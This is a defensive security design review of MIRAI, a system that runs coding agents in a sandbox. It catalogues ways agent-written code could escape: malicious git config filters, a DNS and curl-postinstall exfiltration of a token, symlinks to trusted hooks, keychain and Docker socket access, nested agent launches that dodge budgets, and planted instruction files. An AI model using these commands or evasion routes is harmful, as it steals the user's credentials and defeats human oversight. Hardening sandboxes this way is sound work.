# Round 3 review: Tech Lead lens (safety model only)

Reviewer: independent Tech Lead, security-minded. Scope: the round-2 safety fixes R2-C1 to R2-C5,
R2-M4, R2-M6 (trust-root part), R2-M10, and their Milestone A units. Nothing was executed.

Read in full: `06-review-round-2.md`, `_review/round-2-techlead.md`, `04` D-12, D-15–D-17, D-29,
D-30, D-47–D-52, `01` §1, §6 (stacking part), §7, §7a, §8, §8a, §9, §10, §11, §12, `03` §2, §3,
§4, §8, `07` header + Milestone A + unit 52, `05` §F–§G, `research/09`. Grepped:
`research/08`.

**Fact sources.** **[r09]** / **[r08]** = verified in that research file. **[own, UNVERIFIED]** =
my own knowledge; it must be tested before anything relies on it.

## Summary

**Counts: Critical 4 · Major 12 · Minor 7.**

Round 2's placement fixes are real. The store is out of the project, the Bash wrapper is gone,
verdicts come from stdout, the trust root comes from `main`, and commits belong to the
orchestrator. **TL2-4 and TL2-8 are fully closed. Most of TL2-1 is closed.** The design has
moved from "the layers are in the wrong place" to "the layers have side doors". The side doors
are mostly places where **host-side code (the orchestrator, git, docker build, the unsandboxed
file tools) acts on things an agent or a container can write.**

**Top 3:**

1. **TL3-1 (Critical): the quality gate and the pre-push "green checks" have no defined place
   to run.** The pilot's gate runs `docker compose exec` on the normal stack, which has the real
   `.env` and open network. Re-run after a rebase, or run on the host, it executes agent-written
   code with none of D-48/D-49's hardening. "Agent-written code never runs on the host"
   (`04:871`) isn't true for the gate path yet.
2. **TL3-2 (Critical): test containers mount the whole checkout, `.git` and the real `.env`
   included.** Container test code can write `.git/config` keys other than the two that are
   pinned: `filter.*.clean`, `core.sshCommand`, `credential.helper`, `gpg.program`,
   `include.path`, `remote.*.pushurl`. The orchestrator's own `git add`, `commit` or `push` then
   runs them on the host, unsandboxed, with your credentials. Round 2's "mask `.git`" and "hash
   `.git/config`" fixes (`round-2-techlead.md:132`, `:138-139`) were not adopted.
3. **TL3-3 (Critical): "the token has no route out" is still false.** The sandbox allowlist
   holds the package registries and the model API. Both accept writes made with
   attacker-supplied credentials: `npm publish`, or a file upload to someone else's API account.
   The model API also lets an agent run `claude -p` from Bash, around the launcher, its budgets
   and the recursion guard. How dependencies get installed (with network, over a work tree that
   may hold the token) isn't specified, and neither are Docker builds. Claude's own process isn't
   sandboxed, so the headless allowlist can probably be **empty**. That is a cheap fix.

**Ordering:** no agent runs before its protections exist, **except** the red-team suite. Unit 16
is not a dependency of the launcher (17), so the first headless agent run (19) can happen before
16 passes. Red-team gating applies only to the autonomous preset (TL3-9).

---

## Critical

### TL3-1 · Critical · The quality gate, the baseline and pre-push "green checks" have no specified execution context; as written they run agent code outside the D-48/D-49 hardening

- **Evidence:**
  - D-30's layer 2 claim: "Agent-written code never runs on the host" (`04:871`).
  - The checks are "the project's quality-gate command (found at setup; pilot:
    `scripts/quality-gate.sh`), run from the **trust root** copy of MIRAI" (`01:876`). Where it
    runs, and through what, isn't said. The pilot's gate is `docker compose exec`
    (`03:86`, prior-art column). That means the **normal** project stack, with the real `.env`,
    the default network and egress, not the `run_tests` stack.
  - The gate is also re-run by the orchestrator after a stacked rebase (`01:667`, `04:744`), by
    `pre-push` ("checks are green", `01:1154`; `03:115`; unit 24 `07:182`), and for the baseline
    refresh "at the start of every run" (`01:227`).
  - Round 2's TL2-10 fix 5 said "Pre-push checks a signed gate-result record … It doesn't
    re-run the suites" (`round-2-techlead.md:358-359`). That text was not adopted.
    `04:393` still says "pre-push hook and CI verify the signed proofs plus a green quality gate".
- **Attack:** Kai writes a test or changes a `package.json` script. The orchestrator's gate run
  (or `pre-push`, which the orchestrator calls with the `gh` credentials in reach) executes it.
  That happens either on the host or in a container with the real secrets and egress. TL2-2/TL2-3
  come back through the gate instead of through `run_tests`.
- **Fix:**
  1. Write one rule into D-30: **MIRAI host-side code never executes project code.** The gate,
     lint that loads config or plugins, the build, the baseline and post-rebase re-runs all go
     through the same executor as `run_tests`: trust-root compose, frozen and validated config,
     internal network, dummy secrets (D-48, D-49).
  2. Setup translates the project's gate script into `run_tests` levels (lint, type-check, unit,
     …). A gate step that can't be expressed that way is shown to you and stays off for agent
     runs.
  3. `pre-push` runs **no project code**. It verifies a **signed gate-result record** bound to
     the code hash (TL2-10 fix 5). That also removes the slow suite run from every push.
  4. Red-team: a test file that writes `~/mirai-pwned` when the gate runs it. The file must
     never appear.

### TL3-2 · Critical · Test containers mount `.git` and the real `.env`; host git then runs config the container wrote

- **Evidence:**
  - The validator allows "no host mounts **except the project source**" (`04:1415-1416`,
    `01:817-818`, `07:157`). The sample app's compose "mounts only the project source"
    (`07:105`). The project source is the checkout root, so `.git/` and every `backend/.env` are
    inside it.
  - Host git pins only two keys: `core.hooksPath` and `core.fsmonitor` (`04:413-416`,
    `01:247-248`, `01:834-835`, G15 `05:159`).
  - Round 2 asked for "`.git` is not mounted, or mounted read-only (an anonymous volume over
    `/app/.git`)" and "hash-checks `.git/config` before each command"
    (`round-2-techlead.md:132`, `:138-139`). Neither is in D-48, D-47 or unit 14.
  - D-49 says "the real `.env` is never mounted" (`04:1438`), but only `env_file:` is replaced.
    A bind mount of the source still contains it.
- **Attack** (agent-written test code runs as root in the container, with `/app` = the
  checkout):
  - `git config -f /app/.git/config filter.x.clean 'sh -c "…"'` plus a `.gitattributes` line
    `* filter=x`. The orchestrator's next `git add -A` for its step commit (D-50, `04:1458`) runs
    it on the host. **[own, UNVERIFIED]**
  - `core.sshCommand`, `credential.helper=!cmd` or `remote.origin.pushurl`. These run on, or
    redirect, the orchestrator's push.
  - `commit.gpgsign=true` with `gpg.program`. This runs on every orchestrator commit.
  - `include.path` pulls in any of the above from a work-tree file.
  - `cat /app/backend/.env`. The real secrets get copied into a fixture that the agent then
    reads.
  - Each of these runs outside the sandbox, as you, with the push credentials.
- **Fix:**
  1. The trust-root test override **masks `.git` and every real `.env*`** except `.env.test`,
     using an empty anonymous volume or a tmpfs mount at those paths. The validator **requires**
     the masks and refuses a resolved config without them.
  2. The orchestrator hashes `.git/config`, `.git/info/**`, `.git/hooks/` and the ref list
     **before and after every agent launch and every `run_tests` call**. A change stops the run.
     The hash check is the real control, because the list of dangerous config keys is open-ended.
  3. Host git runs with `GIT_CONFIG_NOSYSTEM=1`, `GIT_CONFIG_GLOBAL=<mirai-home>/gitconfig`
     (a MIRAI-owned minimal file), `--no-ext-diff --no-textconv` on diffs, and the existing pins.
     **[own, UNVERIFIED]**: add this to G15.
  4. Red-team (unit 16): a container write to `.git/config` (a filter, `sshCommand`); a
     container read of `backend/.env`.

### TL3-3 · Critical · Routes out remain: allowlisted write-capable services, the model API from Bash, dependency installs, Docker builds, DNS, encoded tokens

- **Evidence:**
  - The sandbox allowlist is "only the package registries and the model API" (`04:888`,
    `01:260`, `research/09:149-150`).
  - The design's claim: the token "has no route out" (`01:836-840`, `04:948-950`, `04:1447-1448`,
    `05:125-132`, `research/09:182`).
  - Nothing says how dependencies get installed. The internal network (`04:1436-1437`) blocks
    installs inside the test containers. `package.json` and `composer.json` aren't protected
    paths (`04:407-412`).
  - Nothing says whether `run_tests` builds images. The trust-root compose uses `build:` with
    the checkout as context, and `--project-directory <checkout>` is set (`04:1413`).
- **Routes:**
  1. **Attacker credentials on allowlisted hosts.** `npm publish` to `registry.npmjs.org` with
     an npm token carried by a prompt injection or a malicious dependency. An upload to the
     model API's file endpoint with someone else's API key. **[own, UNVERIFIED]**: the second
     has been shown publicly as an exfiltration route on Anthropic-allowlisted sandboxes. The
     allowlist is per domain, so the proxy can't tell a read from a write. **[own]**
  2. **A nested agent from Bash.** With the token readable (G9) and the model API allowlisted,
     `sh -c 'claude -p …'` runs a fresh agent. It sits outside `mirai agent run`, the budget
     ledger and the recursion guard. Denying the Task tool (`04:898`) doesn't cover it, and a
     `Bash(claude *)` deny would be cosmetic (`research/09:49-50`).
  3. **Dependency install with network.** Kai adds `"postinstall": "curl -d @fixture.txt …"`
     or a malicious package. Someone runs the install with network over the work tree: the
     orchestrator, a setup step, or Kai in the sandbox with registry access. The work tree can
     hold the token written there by `echo`. That sends it out.
  4. **Docker build.** Kai edits a Dockerfile, which is a protected path, but that check runs
     only at the floor guard, after the build session (`01:745-747`). A `run_tests` call that
     triggers a build uses the default build network **[own]**, and the build context is the
     work tree.
  5. **DNS.** `nslookup <chunk>.attacker.tld` from sandboxed Bash, or from a container on an
     `internal: true` network. Whether either resolves externally is **[own, UNVERIFIED]**. It's
     a classic route and it isn't in §G.
  6. **Encoded token.** The exact-value scan (`04:917-918`) misses base64, hex or a reversed
     token. On a public repo, the orchestrator's push publishes it.
- **Fix:**
  1. **Headless sandbox allowlist = empty.** Claude Code's own API traffic comes from the
     `claude` process, which isn't a sandboxed command (`research/09:22-23`, `:27`). Add **G16:
     "a headless run works with an empty `allowedDomains`"**. If it holds, routes 1 and 2 close.
  2. **No dependency installs during agent sessions.** Manifests and lockfiles become protected
     paths. In autonomous mode a ticket that needs a new dependency parks. The orchestrator
     installs from the **base** manifests before the session, inside a container with network
     that mounts only the manifests and lockfiles, never the work tree, with lifecycle scripts
     off where the ecosystem allows.
  3. **`run_tests` never builds:** `--no-build`, `pull_policy: never`. The orchestrator builds
     images from **base** Dockerfiles before the session. Protected paths are checked **after
     every agent launch**, not only at the floor guard (round-2 TL2-2 fix 3, not adopted).
  4. DNS: add it to G and to the red-team, from both the sandbox and the test network.
  5. The secret scan also matches the base64, base64url, hex and reversed forms of the token,
     plus an entropy rule on new files. The autonomous preset refuses to run on a public repo.
  6. Rewrite the residual-risk text (TL3-16).

### TL3-4 · Critical · The unsandboxed file tools can follow symlinks the sandboxed shell creates; trust-root hooks and `.git/config` are reachable through them

- **Evidence:**
  - "File tools, MCP servers, and hooks run outside [the sandbox]" (`research/09:22-23`). Their
    only guard is the permission denies, which name literal paths (`04:891-894`).
  - Sandboxed Bash can create a symlink anywhere in the cwd, whatever its target
    (`research/09:25-26`). A Seatbelt write deny is on the resolved path, but creating a link in
    the project is a write to the project **[own]**.
  - Whether Claude Code resolves symlinks before matching `Read`/`Edit` rules, or before the
    `--restricted` working-dir confinement, is in no source and not in §G (`05:143-159`).
  - Hook scripts run outside the sandbox (`research/09:74`). The design says a hook "is
    hash-checked before it runs" (`01:806`), but the re-hash happens "before every launch"
    (`04:268-269`), not before every tool call.
  - **Fallback gap:** if `--restricted` doesn't fit (G10), the `Read` tool can read anything
    outside the project that isn't on the short deny list (`04:893`): `~/.npmrc`,
    `~/.docker/config.json`, `~/.netrc`, `~/.kube`, other projects' `.env`. D7's rule "never
    read outside the project" (`04:855`) is then enforced only for Glob/Grep, by the hook
    (`04:904`).
- **Attack:** `ln -s "<mirai-home>/<id>/trust/<sha>/hooks/pre-tool-use.mjs" h.mjs`, then the
  Edit tool on `h.mjs`. The next tool call in the same session runs the edited hook, unsandboxed,
  before the next launch's re-hash. The same works for `ln -s .git/config g` (TL3-2's payloads)
  and for `ln -s ~/.config/mirai/signing.ed25519 k` with the Read tool.
- **Fix:**
  1. A trust-root **PreToolUse hook on `Read|Edit|Write|MultiEdit|NotebookEdit`** that
     `realpath`s the target (the parent dir for a new file) and denies anything outside
     `realpath(project)`, or inside `.git/`, `.env*` (except `.env.test`) or `.mirai/records/`.
     It runs whether `--restricted` is used or not.
  2. Make the bundle files and folders **read-only and `chflags uchg`** after rendering, so even
     an unsandboxed write by the Edit tool fails. The launcher clears the flag only when it
     re-renders. **[own, UNVERIFIED]**: it's a macOS user-immutable flag; test it.
  3. The hook command in `strict.json` is a fixed shim that checks its own target's hash
     against a value embedded in `strict.json` (itself re-hashed per launch) on **every** call.
  4. New **G17: "Claude Code file tools and `--restricted` resolve symlinks before matching"**,
     plus red-team cases for a symlink to a hook, to `.git/config`, to the key, and to `~/.npmrc`.

---

## Major

### TL3-5 · Major (Critical if it fails) · Docker socket, agent sockets and the keychain are reachable from the sandbox: UNVERIFIED and not in §G

- **Evidence:**
  - "Agents never run `docker` themselves (docker access is root-equivalent)" (`04:876`). The
    only control named is `Bash(docker *)` (`04:896`), which `sh -c` or a path-qualified binary
    bypasses (`research/09:49-50`).
  - "Agents never get push credentials or the `gh` token" (`04:913-914`).
  - Round 2 listed "Docker socket reachability from the sandbox (`allowUnixSockets` is
    unspecified)" and "`docker ps` and `sh -c 'docker ps'`" (`round-2-techlead.md:482-483`,
    `:493`). Neither reached `05` §G (`05:143-159`) or unit 16's list (`07:159`).
- **Paths:**
  - `curl --unix-socket ~/.docker/run/docker.sock http://x/containers/json`. Whether Seatbelt's
    `denyRead` on home blocks a unix-socket `connect()` is **[own, UNVERIFIED]**.
  - `printf 'protocol=https\nhost=github.com\n\n' | git credential fill`. Apple's system git
    config sets `credential.helper=osxkeychain` **[own, UNVERIFIED]**, and that config sits
    outside home, so `denyRead ~` doesn't hide it.
  - `security find-internet-password -s github.com -w`, or the Claude credential item.
  - The `ssh-agent` socket under `/private/tmp/com.apple.launchd.*`.
- **Fix:**
  - Add **G18** with each of the cases above, settled in unit 13, and add them to unit 16.
  - Set `allowUnixSockets` explicitly to empty.
  - If the keychain or the docker socket is reachable and can't be closed by configuration,
    D7's "no container" needs a **separate macOS user for agents**. That **conflicts with
    decision D7** only in the sense that it changes what D7 can deliver, so it comes back to the
    user as a decision, not a silent change.

### TL3-6 · Major · `run_tests` has a validate-then-run TOCTOU, and its validator is a denylist over a large surface

- **Evidence:**
  - D-48 validates `docker compose config`, then runs compose again (`04:1412-1417`).
  - `--project-directory <checkout>` (`04:1413`) makes every relative path in the trust-root
    compose (`build`, `dockerfile`, `env_file`, `include`, `extends`, `secrets`/`configs`
    `file:`) resolve into the agent-writable work tree.
  - Full suites "run in the background with the result polled" (`04:1425-1426`), so the agent
    keeps working while the tool runs.
  - The validator lists only mounts, socket, privileged, host network and capabilities
    (`04:1415-1417`). It misses named volumes with `driver_opts: {type: none, o: bind, device:
    /Users/…}`, `secrets: file: ~/.ssh/id_ed25519`, `volumes_from`, `pid`/`ipc`/`userns: host`,
    `security_opt` and `devices` **[own]**.
  - The validator never says which compose **project name** the test stack uses. If it's the
    same as your daytime stack, `run`/`exec` reuse running containers that have the real `.env`
    and egress.
- **Fix:**
  - **Resolve once, freeze, run the frozen file.** `config --format json` → validate → write to
    `<mirai-home>/…/runs/<id>/compose.resolved.json` → `docker compose -p mirai-<repo-id>-test
    -f <frozen> up --no-build --pull never`.
  - Use an **allowlist validator**: image, command, environment from the test env, volumes =
    project source with the TL3-2 masks, networks = the one internal network, depends_on,
    healthcheck, working_dir, user. Anything else is refused.
  - After start, `docker inspect` the running containers and confirm mounts and networks. Run
    `down -v` before and after.
  - MIRAI host code never uses the per-user temp dir, which the sandbox can write
    (`research/09:25`). It uses `<mirai-home>/tmp`.

### TL3-7 · Major · The trust root sits inside the denied store, so agents can't read their own skills; Ivy's scratch folder and `run_tests` outputs are "in the store" too

- **Evidence:**
  - The trust root is `<mirai-home>/<repo-id>/trust/<sha>/` (`03:271`, `04:399-400`). It holds
    "the plugin dir with MIRAI's skills and agents; the system prompt file" (`04:264-267`).
  - The whole store is denied by `Read` rules and sandbox `denyRead` (`04:893`, `04:1383`).
    Deny beats allow, so a carve-out can't be written (`research/09:51`).
  - Skills read their reference files with the Read tool.
  - `--add-dir` would make the folder **sandbox-writable** (`research/09:25-26`).
  - Ivy writes qa-explore scripts "into a scratch folder in the store" (`01:1089-1091`), which
    is `denyWrite`.
  - `run_tests` returns "screenshots and output paths in the store" (`04:1410-1411`, `03:86`),
    which the agent can't read.
- **Fix:**
  - Split the MIRAI home into three parts:
    - `store/`: tokens, ledger, counters, verdicts. Read and write denied.
    - `bundle/<sha>/`: skills, agents, prompts, `strict.json`, hooks. Read allowed; write denied
      by sandbox `denyWrite`, an `Edit` deny and `uchg` (TL3-4).
    - `scratch/<run>/`: agent-writable and never trusted.
  - `run_tests` returns results **inline** (text plus image content).
  - Add a G item on whether `allowWrite` inside a `denyWrite` path wins, because
    `research/09:24` states precedence only for reads.

### TL3-8 · Major · Supervised launches from your session would run inside the sandbox; the launch-token path doesn't work as specified

- **Evidence:**
  - Workflow skills in your session call `mirai agent run` (`04:258-261`, `04:328`), which needs
    a one-time token "from the orchestrator store or your `mirai session`" (`04:321-323`).
  - Your interactive Claude Code has the sandbox on with the same denies (`03:105`). So
    `mirai agent run`, started from its Bash tool, is a sandboxed child process:
    - it can't read the store or write the run log;
    - it starts `claude -p` *inside* Seatbelt;
    - it only works if the model API is allowlisted, which conflicts with TL3-3 fix 1.
- **Fix:**
  - Use a **launch broker outside the sandbox**: a `launch_agent(role, ticket, step)` tool in the
    *interactive* `mcp.json` (structured arguments, like `run_tests`), or a small `mirai` daemon.
    It holds the session token itself and never exposes it.
  - The headless `mcp.json` never contains it, which gives the recursion guard a structural
    basis.

### TL3-9 · Major · The red-team suite gates only the autonomous preset; headless supervised runs start before it passes

- **Evidence:**
  - "Agents run on your machine from unit 17 on, supervised or not" (`07:156`).
  - Unit 17 depends on 05, 13 and 14 (`07:165`), not on 16. The first agent run checkpoint is
    unit 19 (`07:172`).
  - Red-team gating: "A (supervised), C (red-team test before autonomous)" (`03:117`). "The
    autonomous preset refuses to start unless … the red-team test has passed" (`04:957-958`).
  - A supervised headless launch is `dontAsk`. You watch the gates, not each Bash call, so it is
    unattended at tool level.
- **Fix:**
  - Unit 17 depends on 16.
  - The launcher refuses **any** headless launch unless the red-team result recorded for
    (Claude Code version, `strict.json` hash, Docker version) is green.
  - `doctor` re-runs the suite after an update (`05:122-124`), and the launcher enforces the
    result.

### TL3-10 · Major · Lingering agent processes break the review-to-commit-to-proof chain

- **Evidence:**
  - The write-scope check runs "after every run" (`04:276-278`). The orchestrator commits after
    each green step (`04:1458-1460`).
  - Rex reviews "the diff since `baseline_revision`" by file paths (`01:960`). The red check
    swaps files and restores them in the live checkout (`01:756-758`).
  - Nothing kills processes the agent's Bash started. A sandboxed `nohup … &` can outlive the
    session **[own, UNVERIFIED]**.
- **Attack:** a background process swaps a file back to benign content while Rex reads it, then
  restores the malicious version before the orchestrator's next commit or hash. Or it edits files
  during the red check, so that check measures something else.
- **Fix:**
  - Start each agent in its own process group. After exit, kill the group and verify that no
    process with that group or session remains; a survivor is a run failure.
  - Rex and Ivy review a **committed SHA** through a clean export (TL3-11).
  - Right before every commit and every proof hash, verify that the hash of
    `git status --porcelain=v2 --ignored` is unchanged since the last check.
  - Add a G item: Claude Code's handling of background shells at `-p` exit.

### TL3-11 · Major · Instruction injection: protected paths only raise risk, so in supervised mode the reviewer still loads them; imports and project skill folders aren't covered

- **Evidence:**
  - New or changed `CLAUDE.md`/`AGENTS.md` files are a protected path → high risk; "in
    autonomous mode the ticket parks" (`04:410-411`, `01:827-830`). In supervised mode the
    ticket continues to a **high-risk review**, so Rex reads the planted file.
  - Unit 21 relies on the prompt: "a nested instruction file is ignored as input" (`07:174`).
  - G13 asks only whether nested `CLAUDE.md` loads (`05:157`). `@path` imports from an existing
    `CLAUDE.md` into a non-protected file, `CLAUDE.local.md`, and project
    `.claude/skills|agents|commands` folders may load under `--restricted` or a reduced source
    list **[own, UNVERIFIED]**.
- **Fix:**
  - Rex, Ivy and Vera run with cwd on a **clean export of the committed HEAD**, outside the
    store, read-only, in which every instruction file and tool folder is replaced by the
    **base** version.
  - The protected set includes the import closure of the base's memory files.
  - Extend G13 to imports, `CLAUDE.local.md` and project skills and agents.

### TL3-12 · Major · `.gitattributes`, `.gitignore` and `.lfsconfig` aren't protected; they can hide code from Rex and from your merge review

- **Evidence:** the protected path lists (`04:407-412`, `01:899-901`) don't include them.
- **Attack:**
  - `src/billing.php -diff` makes Rex's `git diff` print "Binary files differ". The proof hash
    uses `--binary` and stays valid.
  - `linguist-generated=true` collapses the file in GitHub's PR view, so you merge it unread
    **[own]**.
  - A `.gitignore` addition hides files from the write-scope diff.
  - `.gitattributes` is also the second half of TL3-2's filter payload.
- **Fix:**
  - Add `**/.gitattributes`, `**/.gitignore`, `.gitmodules`, `.lfsconfig` and
    `.github/CODEOWNERS` to the protected paths.
  - The reviewer's diff runs with `--text --no-textconv --no-ext-diff`.

### TL3-13 · Major · `pull_request_target` and CI scoping are under-specified

- **Evidence:** `mirai-verify` "verifies the proofs' signatures …, the `mirai trace` result …,
  and the framework files against the base branch's `mirai.lock`" (`01:1157-1161`,
  `04:418-421`, `07:238`). The test job runs on `pull_request` (`01:1162-1163`). Both use "the
  same fail-closed trailer/registration scope" (`07:238`, `03:116`).
- **Gaps:**
  1. **The code hash isn't recomputed.** The job must compute SHA-256 over
     `git diff --binary` of `code_paths` at `head.sha` itself, with G14's pinned flags, and
     require a signed proof for **that** hash. Otherwise any validly signed old proof passes.
  2. **The job's own hardening isn't specified:**
     - `permissions:` limited to `contents: read` and `statuses: write`;
     - `actions/checkout` of the **base** with `persist-credentials: false`;
     - the PR head fetched into a separate folder as data;
     - no `npm ci`, no `setup-*` cache, no `actions/cache`. Cache poisoning from PR runs into a
       base-context job is a known pitfall **[own]**.
  3. **A same-named check.** A PR-edited workflow can add a job named `mirai-verify` that
     passes. Whether a required check can be pinned to the real one is **[own, UNVERIFIED]**.
     Extend G11 to it.
  4. **The test job's token.** On `pull_request` it gets a `GITHUB_TOKEN`, and older repo
     defaults give it write access **[own]**. Agent-written test code could push to `main` on an
     unprotected personal repo, which breaks "agents never merge". Set
     `permissions: contents: read`.
  5. **CI can't read the local branch registry** (`04:1381`), so its scope degrades to
     "trailer only". Define the CI rule: MIRAI if any commit has the trailer, **or** the
     committer is the MIRAI git identity, **or** the PR touches `.mirai/records/**`, **or** it
     has the `mirai` label. A mix of trailer and non-trailer commits fails. `handover` must
     leave a marker CI can see (a label, or a signed handover event), or CI keeps gating a
     handed-over branch.

### TL3-14 · Major · The real `.env` is readable by the agent through Bash

- **Evidence:**
  - `Read(.env*)` covers `cat` and redirects (`research/09:47`), but not `python -c`, `node -e`,
    `cp` or `grep -r` (`research/09:49-50`).
  - The sandbox `allowRead`s the whole project (`04:885-886`). No sandbox `denyRead` for `.env*`
    exists (`01:259`).
  - D7's first rule is "never reveal API keys" (`04:853`). Reading them puts them into the
    model context and the stored transcripts.
- **Fix:**
  - Setup enumerates the real `.env*` paths and adds each as an exact sandbox `denyRead`.
    Whether globs work there is UNVERIFIED, so add it to G.
  - Mask the same paths in containers (TL3-2).
  - Red-team: `python3 -c "print(open('backend/.env').read())"`.

### TL3-15 · Major · The `--restricted` fallback is untested, and non-settings user inputs aren't covered

- **Evidence:**
  - G10 tests only whether `--restricted` fits (`05:154`). `research/09:212-214` also lists
    "whether a `--setting-sources` list without `user` is accepted"; that half isn't in §G.
  - `03:105` hard-codes `--restricted` while `04:285-290` and `01:272-274` say "evaluate".
  - The env scrub reads as "unset two variables" (`04:294-296`) in one place and "scrubbed
    except the token" (`04:914-915`) in another.
  - User memory (`~/.claude/CLAUDE.md`), user skills and agents, and `~/.claude.json` aren't
    settings sources. Whether they load in `-p` is **[own, UNVERIFIED]**. On this machine a
    global `CLAUDE.md` exists and would change every agent's behaviour.
- **Fix:**
  - The robust fallback: `CLAUDE_CONFIG_DIR=<mirai-home>/claude-home` for headless runs
    **[own, UNVERIFIED]: test it**. It isolates every user input at once.
  - Make the environment an **allowlist**: `PATH`, `HOME`, `LANG`, `TERM`, the token.
  - Check `apiKeySource`/auth in **every** launch's `stream-json` init event, not only in
    preflight (round-2 TL2-5 fix 3).
  - Extend G10, and make `03:105` match.

### TL3-16 · Major · The residual-risk statements still overclaim

- **Evidence:** `01:864-867`, `04:944-953`, `research/09:179-183` and `05:125-132` say the token
  "has no route out" and that the read gap is "a bug in Claude Code's rule matching".
  TL3-1 to TL3-5 show other gaps: host-side git and the gate acting on agent- or container-written
  inputs, allowlisted write-capable hosts, DNS, symlinks, and the keychain and sockets.
- **Fix** (draft for `04` D-30 Consequences):

  > **Honest residual risk.** This is weaker than a container per agent. The agent runs as you,
  > so every host-side component that touches agent-written files is part of the boundary: the
  > unsandboxed file tools, hooks and MCP servers, the orchestrator's git commands, and the
  > `run_tests` executor. Each one is hardened (path resolution, frozen compose, masked `.git`
  > and `.env`, config hashing), but a bug in any of them crosses the boundary. The login token
  > is readable by the agent unless G9 says otherwise. It has no *known* route out: the
  > headless sandbox has no network, test containers have no outside network or DNS, and the
  > secret scan checks encoded forms. A route we haven't thought of would leak it, so it is a
  > one-year credential you should be able to revoke quickly (`claude setup-token` again). Your
  > merge remains the final gate.

---

## Minor

### TL3-17 · Minor · `run_tests` `path` validation is too loose

- **Evidence:** the only rules are "no `..`, no absolute paths" (`04:1407-1408`).
- **Gaps:**
  - A leading `-` lets the argument act as an option for PHPUnit, Jest or Vitest
    (`--configuration`, `--setupFiles`).
  - A symlinked path escapes the intended folder.
  - The MCP server passes its own environment, token included, to `docker` **[own]**.
- **Fix:**
  - Accept only `^[A-Za-z0-9_][A-Za-z0-9_./:@-]*$`, check that `realpath` is inside the
    project, and pass the value after `--`.
  - Apply adapter-specific escaping for test-ID filters.
  - Call `execFile` with an explicit minimal environment.

### TL3-18 · Minor · The hooks path and `core.hooksPath` persistence are inconsistent

- **Two different paths:**
  - `<trust-root>/hooks` (`01:247`, `01:834`, `07:157`);
  - `<store>/hooks` (`04:415`, `03:270`, `research/09:127`).
- **Two different mechanisms:**
  - the installer "installs git hooks into it (`core.hooksPath`)" (`03:102`), which implies a
    `.git/config` write;
  - unit 10 says "nothing MIRAI controls is written under `.git/`" (`07:153`).
- Which one holds decides whether **your own** `git push` runs the secret scan at all.
- **Fix:** pick `<mirai-home>/…/hooks`, hash-checked. Use `-c core.hooksPath` per orchestrator
  call. `doctor` offers the persistent setting for your own pushes and reports which applies.

### TL3-19 · Minor · Ed25519 key handling

- **Evidence:** a plaintext `signing.ed25519` (`03:279`). There is no key id, timestamp,
  rotation or revocation (`04:507-513`).
- **Interactive gap:** in interactive sessions "the same 'outside the project' rules are `ask`"
  (`04:899-901`). It isn't said that the key, the store and `.git` writes stay **deny** there,
  or that the interactive bundle sets `allowUnsandboxedCommands: false`. One "yes" to
  `script -q /dev/null mirai approve …` would bring R-M1 back.
- **Fix:**
  - Signatures carry `{key_id, ts}`.
  - Add `mirai key rotate` plus a revoked-keys list on `main`.
  - Offer Keychain storage.
  - Keep the key, the store, `.git` writes and `mirai approve|drop|unpark|handover` as hard
    denies in interactive sessions too.

### TL3-20 · Minor · Interactive Playwright MCP is an unsandboxed read and egress channel

- **Evidence:** allowed "only in interactive daytime sessions" (`04:954-956`, `01:1093-1095`).
  It can open `file:///Users/…` and any URL.
- **Fix:** restrict it to the app's localhost origins **[own: the Playwright MCP option
  exists, UNVERIFIED]**, `ask` on every navigate, and never start it in a session that holds the
  token in its environment.

### TL3-21 · Minor · Roadmap dependency inversions in the safety path

- Unit 20's red check needs "a checkpoint ref from unit 26's state machine" and the
  orchestrator's stub commit (`07:173`). Unit 26 depends on 20 (`07:184`), and the commit model
  is unit 23 (`07:181`).
  - **Fix:** move checkpoint refs and step commits into unit 23, and make 20 depend on 23.
- Unit 11 renders the interactive `.claude/settings.json` denies (`07:154`) before the bundle
  that defines them exists (unit 13).
  - **Fix:** 11 renders without denies and refuses interactive use until 13 is done, or reorder
    the two units.

### TL3-22 · Minor · The fail-closed registry fails open when the store is missing

- **Evidence:** the registry lives only in the store (`04:1381`). The MVP assumes one machine,
  so a lost store is expected (D-52, `04:1494`). With the registry missing, every branch looks
  unregistered.
- **Fix:** treat any branch with at least one trailer commit as registered. If MIRAI is
  installed but the registry is missing or corrupt, refuse pushes of MIRAI-trailer branches
  until `doctor` repairs it.

### TL3-23 · Minor · Role write scope and git locks

- Rex and Vera are "read-only" by a *feedback* hook (`03:118`), while the sandbox lets them write
  the cwd. The write-scope check catches tracked files only.
  - **Fix:** per-role `strict.json`, with sandbox `denyWrite` on the project for read-only
    roles.
- `GIT_OPTIONAL_LOCKS=0` (`round-2-techlead.md:89-90`) wasn't adopted. With `.git` deny-write,
  `git status` from agents may log noise or fail.
  - **Fix:** add it to the environment allowlist (TL3-15).

---

## Round-2 Tech Lead findings: closed / still open

| Round 2 | Status | Note |
|---|---|---|
| TL2-1 trust root/store/hooks in `.git` | **Mostly closed** | Moved out (`04:1376`), `.git` denyWrite, stdout verdicts, re-hash per launch. Open: symlink path via file tools (TL3-4), bundle inside the denied store (TL3-7). |
| TL2-2 docker on branch-controlled compose | **Partly** | Trust-root compose, validation, protected paths. Open: `.git` not masked and `.git/config` not hashed (TL3-2), TOCTOU and denylist (TL3-6), builds (TL3-3), protected paths checked only at the floor guard. |
| TL2-3 token and secrets route out | **Partly** | Internal network, dummy secrets, WebFetch denied, exact-value scan. Open: allowlisted registries and model API, installs, DNS, encoded token (TL3-3), real `.env` via Bash and mount (TL3-14, TL3-2), G9 still open. |
| TL2-4 `excludedCommands` wrapper | **Closed** | Replaced by the MCP tool. Argument hygiene in TL3-17. |
| TL2-5 settings sources / `--restricted` | **Partly** | `--restricted` evaluated, sandbox used for "outside". Open: fallback untested, user memory, init-event check (TL3-15), Read tool outside the project in fallback (TL3-4). |
| TL2-6 agents commit / invisible writes | **Mostly closed** | Commit denied, `.git` denyWrite. Open: HEAD/refs/ignored-path snapshot not adopted (TL3-2 fix 2, TL3-10). |
| TL2-7 commit model / fail-open scope | **Mostly closed locally** | Fixed commit points, registry. Open: CI scope (TL3-13.5), lost store (TL3-22), unit order (TL3-21). |
| TL2-8 E2E after review | **Closed** | U2: E2E before review, one proof. |
| TL2-9 red rule / mechanics | **Closed in design** | Out of this round's scope; order issue in TL3-21. |
| TL2-10 adapters / baseline / pre-push re-run | **Partly** | Adapters and per-run baseline adopted. "Pre-push checks a signed gate-result record" not adopted (TL3-1). |
| TL2-11 overnight QA | **Partly** | `qa-explore` added, but its scratch folder and outputs are in the denied store (TL3-7). |
